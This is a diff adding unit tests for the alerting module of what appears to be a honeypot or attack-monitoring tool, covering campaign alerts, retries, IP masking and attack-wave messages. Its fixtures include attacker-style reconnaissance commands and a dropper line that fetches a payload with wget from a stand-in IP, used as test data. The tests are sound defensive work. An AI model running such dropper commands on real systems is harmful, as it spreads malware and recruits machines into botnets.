@@ -3,6 +3,7 @@ import json
 import unittest
 from unittest import mock
 
+import alerts
 import campaigns
 import insights
 import llm
@@ -205,3 +206,52 @@ class NewsTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class AlertTests(unittest.TestCase):
+    def setUp(self):
+        self.store = Store(":memory:")
+        self.sent = []
+
+    def run_alerts(self, now=NOW, fail=False):
+        def sender(cfg, text):
+            if fail:
+                raise OSError("down")
+            self.sent.append(text)
+        insights.update_stats(self.store, now)
+        alerts.run(self.store, {}, now, insights.campaigns_active(self.store, now), sender)
+
+    def add_campaign(self, cmd, net):
+        self.store.add_events([command(f"{net}.{i}", cmd, NOW - 100) for i in range(1, 4)])
+
+    def test_first_run_only_seeds_then_new_campaign_alerts_once(self):
+        self.add_campaign("uname -a", "1.1.1")
+        self.run_alerts()
+        self.assertEqual(self.sent, [])
+        self.add_campaign("cat /proc/cpuinfo", "2.2.2")
+        self.run_alerts(NOW + 900)
+        self.run_alerts(NOW + 1800)
+        self.assertEqual(len(self.sent), 1)
+        self.assertIn("New campaign: Command sequence – 3 IPs, 3 events\n  cat /proc/cpuinfo", self.sent[0])
+        self.assertNotIn("uname", self.sent[0])
+
+    def test_failed_send_is_retried(self):
+        self.run_alerts()
+        self.add_campaign("id", "3.3.3")
+        self.run_alerts(NOW + 900, fail=True)
+        self.run_alerts(NOW + 1800)
+        self.assertEqual(len(self.sent), 1)
+
+    def test_high_risk_session_with_masked_ip(self):
+        self.run_alerts()
+        for key, risk in (("a", "high"), ("b", "low")):
+            self.store.put_insight("session", key, NOW, {"commands": ["wget http://9.8.7.6/x"], "ips": 1},
+                                   json.dumps({"summary": f"Dropper {risk}", "intent": "botnet-recruitment", "risk": risk}))
+        self.run_alerts(NOW + 900)
+        self.assertIn("High-risk session (1 IPs): Dropper high\n  wget http://9.8.7.x/x", self.sent[0])
+        self.assertNotIn("Dropper low", self.sent[0])
+
+    def test_wave_text(self):
+        wave = {"kind": "wave", "asns": [["AS1", "Bad ISP", 7]], "factor": 6.2, "events": 700, "ips": 7}
+        self.assertEqual(alerts.campaign_text(wave),
+                         "Attack wave ×6.2 from Bad ISP (AS1): 700 events from 7 IPs in the last hour")
